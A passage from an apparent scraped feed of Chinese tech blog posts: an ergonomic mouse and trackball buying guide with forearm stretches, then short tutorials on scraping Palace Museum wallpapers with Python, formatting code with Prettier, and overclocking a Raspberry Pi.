Spinoff</a></figcaption></figure><p>对于惯用手腕活动鼠标的人来说，在进行大范围移动时，手腕需要反复左右弯折（桡偏与尺偏），而这两个动作的最大活动范围相加，只有 50° 上下，何况移动半径只有手掌的长度。这样的动作向上移交给肩关节和肘关节后，却可以分解为屈肘、展肩这样对关节来说没什么负担的动作。同时，完成这些动作所需的肌肉也不会受到过分牵拉，神经、肌腱等结构也能在一个合适且安全的范围内活动。</p>\n<p>人体的自适应机制比较强大，如果感到不适，动作也会自动进行调整。逐渐地，依靠手臂瞄准也就成了一种大范围现象。FPS 职业选手比例尤其高，主要还是因为对快速拉枪等高速运动的需求更多，单纯使用手腕的伤害更大，大幅度动作就自然地向手臂肌肉移动，只留下小范围微调由手腕控制。</p>\n<h2>什么样的鼠标能减轻手部疲劳？</h2>\n<p>人体是一副精妙的机器。我们全身上下的骨骼、肌肉、神经等等组织器官共同构成了这套复杂的系统。问题在于，它和诸多器械一样，不按照最合适的方式使用与维护，就会加速磨损，最终造成功能和结构的损伤。</p>\n<p>长期坐办公室的朋友可能遇到过或大或小的手部问题。有人可能手指酸胀、麻木；有人在活动关节时疼痛、弹响；有一些更严重的，在不活动时手掌也开始疼痛，甚至在夜间痛醒。考虑到办公室发放/配备的鼠标很有可能是尺寸偏小的对称鼠标，这些疼痛与不适就更像是身体对不当工作姿势和劳作强度提出的严正抗议（，最严重的那种已经称得上是起义了）。大部分的不适都可以在足量的休息后恢复，但如果你的工作限制了你的休息空间，选择合适的鼠标和键盘、采用更健康的姿势，可以大大延缓这些职业劳损的发生。</p>\n<h3>从对称鼠到垂直鼠</h3>\n<p>很多人在使用对称鼠时并没有感受过太明显的不适，其实是因为在不需要精准操作时，手臂会自己调整到一个舒服的姿态，以更符合自然角度的模式搭在鼠标上，而你可能并没有意识到。</p>\n<figure class=\"ss-imgRows\" figcaption=\"完全放松使用对称鼠标，手部也会自然摆出倾斜的姿势。\"><img src=\"https://cdn.sspai.com/2021/09/30/1f1a6f60c33cef6405d3432588f28935.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/30/93cf472e2da2f4cc1a7b02a89b3407cc.jpg\" alt=\"\"></figure><p>这样的休息姿势并不方便控制鼠标，只能做做简单的点击。对于需要长时间高精准使用鼠标的群体来说，比起让身体调整，更好的方法是让鼠标外形发生变化，让它为使用者提供一个可以自然搭握的外形，既能方便地握紧，又能减少手腕、手臂扭转带来的肢体压力。</p>\n<p>这就是人体工学鼠标的基本目的。而设计这样的鼠标，最简单的方法就是把处在自然放松状态下的小臂转到桌面上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2gtb34teit0pmpc0.jpeg\"><figcaption>Evoluent Vertical Mouse 4，图源：<a href=\"https://www.ergonomicessentials.com.au/blog/why-are-evoluent-vertical-mice-so-popular/\" target=\"_blank\">ErgonomicEssentials</a></figcaption></figure><p>很多经典的办公工学鼠标都选择了这样的策略，这一类型的鼠标常常被称作「垂直鼠标」。一般认为最早的人体工学鼠标就是 Jack Lo 在 1994 年发明的「握手握法」鼠标 Evoluent，这是第一款为全手掌提供竖直支撑的鼠标。</p>\n<p>竖直设计的鼠标最直观的效果就是能让趴在桌面上的手腕和前臂以一个自然的角度稍稍悬空，直接减轻外界压力，同时可以方便活动。此后，越来越多的品牌依循类似的思路，开发了各式各样的人体工学鼠标模具。</p>\n<h4>罗技 MX Vertical</h4>\n<p>罗技在办公室外设上投入的心血是很多品牌难以比拟的，毕竟不是每个办公室外设厂商都会建立人体工学实验室。MX Vertical 作为 Ergo 系列的经典产品，在保证外观设计符合人体工学的基础上，搭载了罗技的优联技术，并且支持罗技 Flow，可以多设备跨屏使用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2h5b34teh5fkvc6g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2hdb34teit0pmpcg.jpeg\" alt=\"\"></figure><p>MX Vertical 是我用过一段时间的鼠标，外观设计和选料都让人爱不释手。但它相对无强制手指定位的设计可能在握持时造成一定的误解。刚开始使用的一两天里，我始终感觉这款鼠标定位不准，后来发现是我的握姿不对——虎口并不是紧贴在弧度最明显的点位的，手指也不用僵硬地伸直。如上图所示，这款鼠标俯视时显得很扭曲，是因为顶部越收越窄，最终收在一个偏左的位置，符合了手部自然状态时类似握手的状态。正确的握姿是手放松地搭在宽大的底盘稍上，手指无需伸直，自然蜷曲时，虎口位置低且斜，停在弧度最明显位置的其实是食指根部。在调整了自己的握姿后，定位也正常了，手也更加舒适，小臂的酸痛都少了一些。</p>\n<h4>山业 Sanwa Supply 人体工学系列</h4>\n<p>来自日本的山业其实生产了不少符合人体工学设计的竖直鼠标，不知道什么原因，他们总是被大家遗忘，只能怪中文名太不响亮了。由于配色克制、设计经典，山业的鼠标常常成为其他厂商翻模山寨的对象。其中最经典的，莫过于带腕托的 MA-ERGW6。</p>\n<figure class=\"ss-imgRows\" figcaption=\"图：Sanwa Supply 官网，左 MA-ERGW6，右 400-MA059\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2hlb34teit0pmpd0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2htb34teh0gc1cg0.png\" alt=\"\"></figure><p>与 MX Vertical 相比，山业各个型号的鼠标外形都更加远离常规印象中的「鼠标」，除了 MA-ERGW6 这种带腕托的大块头之外，还有 400-MA059 这种取消了主按键、以晃动代替点击、从而做到左右手可通用的绝对异类（可惜已经停售）。比起附带了更多利于办公的技术的罗技，山业就像是老老实实的匠人，一门心思在模具上下工夫。</p>\n<h4>微软 Sculpt Ergonomic</h4>\n<p>之前在 <a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工用什么外设</a> 的文章里，我提到过这个圆滚滚的大馒头。虽然和上面提到的这些实打实的竖直鼠标有些差别，但实际体验上，它在手部支撑的饱满程度上基本可以归为一档。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2htb34teit0pmpdg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2i5b34teh3cl8k6g.png\" alt=\"\"></figure><p>微软在人体工学外设方面同样耕耘多年。这支昵称「大馒头」的鼠标在近几年微软的新模具中最引人注目。虽然外表看起来像闹着玩一样，但它对手掌的支撑是实打实的好。对于目前那些办公室桌椅高度不合适又不可调的群体来说，这个整体高度稍稍有些离谱的鼠标反而可以在大部分桌面保证使用者的手腕足够悬空不被压迫，同时手掌受到足够支撑不至于太累。虽然外形和之前的两个品牌差别巨大，实际体验上，Sculpt Ergonomic 的握感还是更接近竖直鼠标，饱满，手部更直立，手腕压迫小。</p>\n<h3>在舒适与易用中平衡</h3>\n<p>还有一类「人体工学鼠标」，在外形上就没有这么激进，它们更多地是在保留过往使用习惯和操控灵活度的基础上，对右手支撑进行适配。游戏玩家更容易接受这类鼠标。我习惯把它们笼统地称为「人体工学游戏鼠标」，罗技的 G403 系列模具、雷蛇当家的蝰蛇系列模具、ZOWIE 的 EC 系列，都是经典的右手人体工学鼠标。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：罗技 G403，右：ZOWIE EC2\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2idb34teh3cl8k70.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2ilb34teit0pmpe0.png\" alt=\"\"></figure><p>通常来说，竖直鼠标由于外形比较怪异，和常规使用鼠标的姿势差别过大，购买者往往是对鼠标的精准度要求不高但使用频次高的办公室人群。这也使得竖直鼠标的厂商更倾向于选择那些适合在各种平面使用的引擎，最有代表性的就是微软的蓝影，在办公鼠标界撑起一篇天的各型号激光引擎也是这样，我把这些硬性能比较落后的引擎统称为「办公引擎」。</p>\n<p>办公鼠标引擎的问题就是不适合游戏，尤其是 FPS 游戏。由于追踪速度和传感器帧率这两项指标的落后，激光引擎和蓝影可以做到「精准」，但它的精准只在慢速下成立。快速滑动使用了办公引擎的鼠标导致的丢帧可能会带来画面的抽搐、快速闪动、不跟手等等游戏体验上的意外，有可能导致眩晕——至少我疯狂选购外设的道路就是从这里开始的。</p>\n<p>这一类型的鼠标我在 <a href=\"https://sspai.com/post/66327\" target=\"_blank\">游戏鼠标指南</a> 一文之中有过介绍。单就人体工学的舒适程度这一方面来说，这类鼠标的实际效果较小，顶多相当于让你的手处在「使用对称鼠时拿来休息的位置」。但如果你平常游戏玩得很多，而且不打算把办公和游戏的鼠标分开，这样的人体工学鼠标其实也是不错的选择。它最大的特点，就是有大量厂商使用了性能足够强劲的<strong>光电鼠标引擎</strong>，保证各方面性能都跟得上时代主流。具体购买时，可以对照我在游戏鼠标指南的文章中提到的选购原则。一定要注意手长。对于需要打游戏的使用者来说，尺寸的宽容度会变小，因为在需要仔细瞄准时，人会下意识抓紧鼠标，再加上手汗带来的影响，过大和过小的尺寸都会让手更加紧张。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2itb34teh3cl8k7g.jpeg\"><figcaption>比如我用的 MM720 和 ROG 月刃，对平均手来说就小了一些，分别代表了强制人体工学和一般人体工学两种设计。</figcaption></figure><h3>另辟蹊径的选择</h3>\n<p>如果你对这些都不感兴趣，或许可以试试别的指点设备。即使桌面够大、不需要使用专业软件，<strong>轨迹球</strong>也是一个不错的选择。</p>\n<p>既然鼠标的活动方式会让你的手腕不适，前臂麻木，那干脆不要在桌面上移动鼠标。轨迹球的设计给了足够的手部调整空间。手指用累了用手掌，右手用累了换左手。</p>\n<h4>Kensington 轨迹球</h4>\n<p>在这个几乎所有公司都要停产轨迹球设备的年代，Kensington 依旧屹立如初。作为可能是目前最大的轨迹球生产商，Kensington 提供了各式各样的轨迹球设计，有线无线、腕托按键、四指或拇指，只要想要，基本都有。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2j5b34teh3cl8k80.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jdb34teit0pmpeg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jlb34teit0pmpf0.png\" alt=\"\"></figure><h4>罗技 MX Ergo</h4>\n<p>罗技也是少数尚未停产轨迹球产品的厂商之一。MX Ergo 和 Ergo M575 是 Ergo 系列中现在还在售的轨迹球型号。两者的设计思路基本一致，最大的差别在于 MX Ergo 支持额外的角度调整。相比只能平趴的 M575，MX Ergo 允许使用者斜向抬起最大 20°，进一步贴合手臂角度。但这两款都是拇指轨迹球，对于一部分用户来说可能需要<strong>谨慎选择</strong>。由于这种设计限制了轨迹球只能由右手拇指操作，大量使用拇指也可能影响拇指的健康，选择时需要参考自己的使用习惯。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：罗技 MX Ergo，右：罗技 Ergo M575\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jtb34teh5fkvc70.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2k5b34teit0pmpfg.png\" alt=\"\"></figure><h2>更换设备也不能忘记放松</h2>\n<p>工学鼠标推荐了不少，这些类型的鼠标都可以让你的工作生活稍微少一点点疲劳，即使没直接看到自己心仪的型号，联系之前的鼠标选购指南，相信你也能知道选购适合自己的鼠标的方法。可说到底，它们仍然是工作用品。鼠标的舒适，只能让你的疲劳和损伤来得慢一点、轻一点，如果不进行日常的保护和拉伸，选择工学鼠标也不能让你逃离被劳损找上门的命运。</p>\n<p>可能有人会说，自己的对称鼠标也用得挺好，没觉得会造成损伤。但这涉及的其实是几个方面平衡的问题：<strong>鼠标重量</strong>，<strong>个人体质</strong>，和<strong>鼠标外形</strong>。如果鼠标的造型对手腕和手臂不甚友好，它就要做到足够轻，来减小你移动鼠标时对手腕和手臂造成的冲击；如果鼠标的外形合适，它的重量就可以大一些。近来游戏鼠标的轻量化、无线化趋势其实也是这个道理：对称鼠标更适合快速移动、操作更加敏捷，也就是所谓的「跟手」，但想要让它对你的身体结构友好，它就要轻到让你注意不到使用时胳膊承受的拉伸。但更早些时候，鼠标总是做重来凸显高级，鼠标「越重越稳」的错误观念也还是在消费者的脑子里植根，这种观念下选择的超重鼠标其实是在赌自己的体质足够刚猛——疼痛发生的那一刻前，你永远不会觉得它有问题。</p>\n<p>此外需要额外提及一点：鼠标最好不要随意使用腕托。如果你的鼠标没有放在比较低的位置，甚至已经需要弯折手腕使用鼠标的情况下，加一个腕托不仅不会缓解疲劳，反而会因为对手腕造成压迫进一步加重腕部不适。真正有效的鼠标腕托需要配合正确的高度、正确的姿势并给予人体工学的设计，那种便宜的海绵腕托提供的柔软感觉非常具有欺骗性，给你的是虚假的舒适。悬空的疲惫也好过压迫的危险。</p>\n<p>在一篇关于「重复性劳损」（RSI，repetitive strain injury）的文章中，作者提出，RSI 这个名词本身就过于笼统，覆盖了太多的与职场相关的上肢疼痛，并不是一个良好的医学术语。而目前的研究看来，对于受到「RSI」侵扰的上班族来说，最难的就是证明这种疼痛与职场状态的关联。</p>\n<p>但同样，文章也指出，这些疼痛、病变等在很大程度上与对神经、血管、肌肉有影响的动作相关，包括过度拉伸、震动等。矿工、学生、网球运动员、高尔夫球运动员等常见的肘部职业病就是比较典型的例子。长期坐在桌前、缺乏运动的办公人士，即使生理上没有产生病变，心理变化也可能造成身体感知的异常。所以，即使更换了设备，最好还是定期活动拉伸手臂，多方位防护才能避免异常疼痛的发生。</p>\n<h3>Mayo Clinic 推荐的前臂拉伸法</h3>\n<p>接下来介绍的这种拉伸方法十分简单，但确实有效。在工作前与长时间工作后进行拉伸，可以让你的前臂提前进入活动状态，并在几乎固定的工作后得到放松。你可以前往 <a href=\"https://www.mayoclinic.org/healthy-lifestyle/adult-health/multimedia/forearm-stretches/vid-20084698\" target=\"_blank\">Forearm stretches for the workplace</a> 观看指导视频，以下图片均来自 Mayo Clinic 视频截图，当然了，这些动作非常简单，只阅读文字描述就可以标准地做好。</p>\n<p>在整个拉伸过程中，保持正常呼吸，不要憋气。动作轻柔，如果你感到疼痛，说明你的动作太大了。</p>\n<h4>第一步</h4>\n<p>自然抬起一支手臂，手腕自然下垂。另一只手将下垂的手向内拉伸，感觉上臂有「肌肉拉伸」的感觉即可，保持 15 秒。之后换手，重复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2kdb34teh5fkvc7g.png\"></figure><h4>第二步</h4>\n<p>自然抬起一支手臂，这次手掌向上。另一只手将抬起的手向内拉伸，感觉上臂有「肌肉拉伸」的感觉即可，保持 15 秒。之后换手，重复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2ktb34teh3cl8k8g.png\"></figure><h4>第三步</h4>\n<p>双臂平举放松，两只手缓慢绕手腕向内旋转，活动 15~30 秒后，换方向向外旋转，重复。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2l5b34teh0gc1cgg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2llb34teit0pmpg0.png\" alt=\"\"></figure><p>其他部位的拉伸也推荐每日重复。</p>\n<p>希望你在工作中保持健康，不会遭受疼痛的困扰。</p>\n<h4>相关参考</h4>\n<p>Helliwell PS, Taylor WJ. Repetitive strain injury. <i>Postgraduate Medical Journal</i> 2004;80:438-443.</p>\n<p>UCSF, Maintain a Neutral Posture, https://ehs.ucsf.edu/maintain-neutral-posture</p>\n<p>Mayo Clinic, <a href=\"https://www.mayoclinic.org/healthy-lifestyle/adult-health/multimedia/forearm-stretches/vid-20084698\" target=\"_blank\">Forearm stretches for the workplace</a> (Video)</p>\n<p>身体各部位中立位：University of Wisconsin System, <a href=\"https://www.wisconsin.edu/ehs/osh/ergonomics-2/maintaining-neutral-postures/\" target=\"_blank\">Maintaining Neutral Postures</a></p>\n<p>Cornell University Ergonomics Web, <a href=\"https://ergo.human.cornell.edu/cumousetips.html\" target=\"_blank\">CUergo: 10 Tips for Mouse Use</a></p>\n<h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66327\" target=\"_blank\">用过 30 多款游戏鼠标后，我想聊聊如何筛选到趁手利器</a></li>\n<li><a href=\"https://sspai.com/post/68599\" target=\"_blank\">办公室与宿舍的防刺杀装备：静音键鼠详解</a></li>\n<li><a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工的桌面长啥样——键鼠外设用些啥？</a></li>\n<li><a href=\"https://sspai.com/post/67354\" target=\"_blank\">手腕救星还是烧钱摆件？聊聊人体工学键盘</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69064"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" 